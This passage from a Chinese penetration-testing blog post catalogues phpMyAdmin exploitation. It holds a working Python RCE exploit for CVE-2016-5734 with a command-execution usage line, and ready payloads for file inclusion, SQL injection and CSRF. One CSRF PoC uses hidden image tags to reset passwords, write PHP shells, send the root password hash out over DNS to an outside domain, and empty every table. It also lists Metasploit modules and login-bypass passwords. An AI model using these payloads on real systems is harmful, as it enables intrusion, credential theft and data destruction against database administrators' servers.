pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">"token="</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">"Cannot get valid authorization token."</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"is_js_confirmed"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"db"</span>: db,</span><br><span class="line">            <span class="string">"token"</span>: token,</span><br><span class="line">            <span class="string">"pos"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"sql_query"</span>: sql,</span><br><span class="line">            <span class="string">"sql_delimiter"</span>: <span class="string">";"</span>,</span><br><span class="line">            <span class="string">"show_query"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"fk_checks"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"SQL"</span>: <span class="string">"Go"</span>,</span><br><span class="line">            <span class="string">"ajax_request"</span>: <span class="string">"true"</span>,</span><br><span class="line">            <span class="string">"ajax_page_request"</span>: <span class="string">"true"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">"/import.php"</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">"success"</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">"error"</span>][resp.json()[<span class="string">"error"</span>].find(<span class="string">"&lt;code&gt;"</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">"&lt;/code&gt;"</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"already exists"</span> <span class="keyword">in</span> error:</span><br><span class="line">                        print(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">"ERROR: "</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">"db"</span>: db,</span><br><span class="line">        <span class="string">"table"</span>: table,</span><br><span class="line">        <span class="string">"token"</span>: token,</span><br><span class="line">        <span class="string">"goto"</span>: <span class="string">"sql.php"</span>,</span><br><span class="line">        <span class="string">"find"</span>: <span class="string">"0/e\0"</span>,</span><br><span class="line">        <span class="string">"replaceWith"</span>: payload,</span><br><span class="line">        <span class="string">"columnIndex"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"useRegex"</span>: <span class="string">"on"</span>,</span><br><span class="line">        <span class="string">"submit"</span>: <span class="string">"Go"</span>,</span><br><span class="line">        <span class="string">"ajax_request"</span>: <span class="string">"true"</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">"/tbl_find_replace.php"</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">"message"</span>][resp.json()[<span class="string">"message"</span>].find(<span class="string">"&lt;/a&gt;"</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> len(result):</span><br><span class="line">            print(<span class="string">"result: "</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        print(</span><br><span class="line">            <span class="string">"Exploit failed!\n"</span></span><br><span class="line">            <span class="string">"Try to manually set exploit parameters like --table, --database and --token.\n"</span></span><br><span class="line">            <span class="string">"Remember that servers with PHP version greater than 5.4.6"</span></span><br><span class="line">            <span class="string">" is not exploitable, because of warning about null byte in regexp"</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<p>利用如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cve-2016-5734.py -u root --pwd&#x3D;&quot;&quot; http:&#x2F;&#x2F;localhost&#x2F;pma -c &quot;system(&#39;ls -lua&#39;);&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3-4-CVE-2018-12613：后台文件包含"><a href="#3-4-CVE-2018-12613：后台文件包含" class="headerlink" title="3.4 CVE-2018-12613：后台文件包含"></a>3.4 CVE-2018-12613：后台文件包含</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	4.8.0和4.8.1</span><br></pre></td></tr></table></figure>

<p>利用如下：<br>（1）执行SQL语句，将PHP代码写入Session文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</span><br></pre></td></tr></table></figure>


<p>（2）包含session文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.1.1.10&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;l ib&#x2F;php&#x2F;sessions&#x2F;sess_*** 		# *** 为phpMyAdmin的COOKIE值</span><br></pre></td></tr></table></figure>

<h3 id="3-5-CVE-2018-19968：任意文件包含-RCE"><a href="#3-5-CVE-2018-19968：任意文件包含-RCE" class="headerlink" title="3.5 CVE-2018-19968：任意文件包含/RCE"></a>3.5 CVE-2018-19968：任意文件包含/RCE</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	4.8.0~4.8.3</span><br></pre></td></tr></table></figure>

<p>利用如下：<br>（1）创建数据库，并将PHP代码写入Session文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>（2）生成foo数据库的phpMyAdmin的配置表，访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.1.1.10&#x2F;chk_rel.php?fixall_pmadb&#x3D;1&amp;db&#x3D;foo</span><br></pre></td></tr></table></figure>

<p>（3）篡改数据插入pma column_info中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO&#96; pma__column_infoSELECT &#39;1&#39;, &#39;foo&#39;, &#39;bar&#39;, &#39;baz&#39;, &#39;plop&#39;,&#39;plop&#39;, &#39; plop&#39;, &#39;plop&#39;,&#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_***&#39;,&#39;plop&#39;; # *** 为phpMyAdmin 的COOKIE值</span><br></pre></td></tr></table></figure>

<p>这里要注意不用系统的session保存位置不同，具体系统可以在phpMyAdmin登录后首页看到</p>
<p>MacOS：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>Linux：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions</span><br></pre></td></tr></table></figure>

<p>phpStudy：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;tmp&#x2F;tmp</span><br></pre></td></tr></table></figure>


<p>（4）访问包含Session文件的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.1.1.10&#x2F;tbl_replace.php?db&#x3D;foo&amp;table&#x3D;bar&amp;where_clause&#x3D;1&#x3D;1&amp;fields_name[ multi_edit][][]&#x3D;baz&amp;clause_is_unique&#x3D;1</span><br></pre></td></tr></table></figure>

<h3 id="3-6-CVE-2020-0554：后台SQL注入"><a href="#3-6-CVE-2020-0554：后台SQL注入" class="headerlink" title="3.6 CVE-2020-0554：后台SQL注入"></a>3.6 CVE-2020-0554：后台SQL注入</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	phpMyAdmin 4&lt; 4.9.4</span><br><span class="line">	phpMyAdmin 5&lt; 5.0.1</span><br><span class="line">	前提：已知一个用户名密码</span><br></pre></td></tr></table></figure>

<p>简单总结流程：</p>
<p>页面位置server_privileges.php；</p>
<p>设置变量ajax_requests为true；</p>
<p>设置变量validate_username 为真值；</p>
<p>设置变量username 为我们拼接的注入语句。</p>
<p>构造payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.209.139:8001/server_privileges.php?ajax_requests=true&amp;validate_username=1&amp;username=1%27or%201=1%20--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></span><br></pre></td></tr></table></figure>

<p>（token和其余参数会在访问页面的时候自动提供）</p>
<p>我们查看后端收到的数据，可以看到SQL已经成功拼接。</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/1.png" alt></p>
<p>执行完毕后程序只会告知SQL是否执行成功，失败会报错，因此此处我们可以利用报错注入。</p>
<p>构造payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.209.139:8001/server_privileges.php?ajax_request=true&amp;validate_username=1&amp;username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></span><br></pre></td></tr></table></figure>

<p>结果如下，可以看到已经成功执行了我们注入的指令。</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/2.png" alt></p>
<p><a href="https://cloud.tencent.com/developer/article/1599837" target="_blank" rel="noopener">CVE-2020-0554：phpMyAdmin后台SQL注入</a></p>
<h3 id="3-7-CVE-2019-12922-跨站请求伪造"><a href="#3-7-CVE-2019-12922-跨站请求伪造" class="headerlink" title="3.7 CVE-2019-12922 跨站请求伪造"></a>3.7 CVE-2019-12922 跨站请求伪造</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	&lt;&#x3D; 4.9.0.1</span><br></pre></td></tr></table></figure>

<p>利用如下：</p>
<p>在登录状态下，添加一个服务器</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/3.png" alt></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.123.65/phpmyadmin/setup/index.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/4.png" alt></p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/5.png" alt></p>
<p>点击删除时，通过工具抓包</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/6.png" alt></p>
<p>参数id对应的是第几个服务器。构造恶意链接。</p>
<p>当然实战中的链接怎么吸引人让目标去点击还得靠自己去构造。</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/7.png" alt></p>
<p>页面显示404，但img的src会去请求一次。此时创建了两个服务器</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/8.png" alt></p>
<p>点击我们构造的恶意链接时，显示刚才构造的页面结果</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/9.png" alt></p>
<p>此时再去查看服务器</p>
<p><img src="/2020/10/14/phpMyAdmin-Summary/Blog/10.png" alt></p>
<p>已经被删除，攻击成功。</p>
<p><a href="https://cloud.tencent.com/developer/article/1517920" target="_blank" rel="noopener">CVE-2019-12922 phpMyAdmin 4.9.0.1-跨站请求伪造漏洞复现</a></p>
<h3 id="3-8-CVE-2017-1000499-跨站请求伪造"><a href="#3-8-CVE-2017-1000499-跨站请求伪造" class="headerlink" title="3.8 CVE-2017-1000499 跨站请求伪造"></a>3.8 CVE-2017-1000499 跨站请求伪造</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	Phpmyadmin:4.7.6  </span><br><span class="line">	Phpmyadmin:4.7.0:Beta1  </span><br><span class="line">	Phpmyadmin:4.7.0:Rc1  </span><br><span class="line">	Phpmyadmin:4.7.5  </span><br><span class="line">	Phpmyadmin:4.7.4</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: phpMyAdmin 4.7.x - Cross-Site Request Forgery</span><br><span class="line"># Date: 2018-08-28</span><br><span class="line"># Exploit Author: VulnSpy</span><br><span class="line"># Vendor Homepage: https:&#x2F;&#x2F;www.phpmyadmin.net&#x2F;</span><br><span class="line"># Software Link: https:&#x2F;&#x2F;www.phpmyadmin.net&#x2F;downloads&#x2F;</span><br><span class="line"># Version: Versions 4.7.x (prior to 4.7.7)</span><br><span class="line"># Tested on: php7 mysql5</span><br><span class="line"># CVE: CVE-2017-1000499</span><br><span class="line"></span><br><span class="line"># Exploit CSRF - Modifying the password of current user</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Hello World&lt;&#x2F;p&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;7f366ec1afc5832757a402b5355132d0.vsplate.me&#x2F;sql.php?db&#x3D;mysql&amp;table&#x3D;user&amp;sql_query&#x3D;SET%20password</span><br><span class="line">%20&#x3D;%20PASSWORD(%27www.vulnspy.com%27)&quot; style&#x3D;&quot;display:none;&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"># Exploit CSRF - Arbitrary File Write</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Hello World&lt;&#x2F;p&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;7f366ec1afc5832757a402b5355132d0.vsplate.me&#x2F;sql.php?db&#x3D;mysql&amp;table&#x3D;user&amp;sql_query&#x3D;select</span><br><span class="line">&#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test.php&#39;;&quot;</span><br><span class="line">style&#x3D;&quot;display:none;&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"># Exploit CSRF - Data Retrieval over DNS</span><br><span class="line"></span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE</span><br><span class="line">user&#x3D;&#39;root&#39; LIMIT 1),&#39;.vulnspy.com\\test&#39;));</span><br><span class="line"></span><br><span class="line"># Exploit CSRF - Empty All Rows From All Tables</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Hello World&lt;&#x2F;p&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;7f366ec1afc5832757a402b5355132d0.vsplate.me&#x2F;import.php?db&#x3D;mysql&amp;table&#x3D;user&amp;sql_query&#x3D;DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A&quot;</span><br><span class="line">style&#x3D;&quot;display:none;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000499" target="_blank" rel="noopener">CVE-2017-1000499</a></p>
<h2 id="0x04-特殊版本GetShell"><a href="#0x04-特殊版本GetShell" class="headerlink" title="0x04 特殊版本GetShell"></a>0x04 特殊版本GetShell</h2><h3 id="4-1-CVE-2013-3238"><a href="#4-1-CVE-2013-3238" class="headerlink" title="4.1 CVE-2013-3238"></a>4.1 CVE-2013-3238</h3><blockquote>
<p>​    影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p>
<p>​    利用模块：exploit/multi/http/phpmyadminpregreplace</p>
</blockquote>
<h3 id="4-2-CVE-2012-5159"><a href="#4-2-CVE-2012-5159" class="headerlink" title="4.2 CVE-2012-5159"></a>4.2 CVE-2012-5159</h3><blockquote>
<p>​    影响版本：phpMyAdmin v3.5.2.2</p>
<p>​    利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p>
</blockquote>
<h3 id="4-3-CVE-2009-1151"><a href="#4-3-CVE-2009-1151" class="headerlink" title="4.3 CVE-2009-1151"></a>4.3 CVE-2009-1151</h3><blockquote>
<p>​    PhpMyAdmin配置文件/config/config.inc.php存在命令执行    </p>
<p>​    影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p>
<p>​    利用模块：exploit/unix/webapp/phpmyadmin_config</p>
</blockquote>
<h3 id="4-4-弱口令-amp-万能密码"><a href="#4-4-弱口令-amp-万能密码" class="headerlink" title="4.4 弱口令&amp;万能密码"></a>4.4 弱口令&amp;万能密码</h3><blockquote>
<p>​    弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p>
<p>​    万能密码：版本2.11.3 / 2.11.4，用户名‘localhost’@‘@”则登录成功</p>
</blockquote>
<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://www.cnblogs.com/xhcbj/p/13356580.html" target="_blank" rel="noopener">phpMyAdmin渗透利用总结</a></p>
<p><a href="https://mp.weixin.qq.com/s/9Tkcn2AtGrHUsIbRCQ-ZSQ" target="_blank" rel="noopener">phpMyAdmin 渗透利用总结</a></p>
<p><a href="https://www.freebuf.com/articles/web/226240.html" target="_blank" rel="noopener">phpMydmin的GetShell思路</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ch4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/10/14/phpMyAdmin-Summary/">http://yoursite.com/2020/10/14/phpMyAdmin-Summary/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">Chaceshadow's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/phpMyAdmin/">phpMyAdmin</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/09/29/DomainPenetration/"><span>内网渗透之初识域渗透</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/welcome-image.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Ch4ce</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js?version=1.7.0"></script><script src="/js/search/local-search.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"right","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>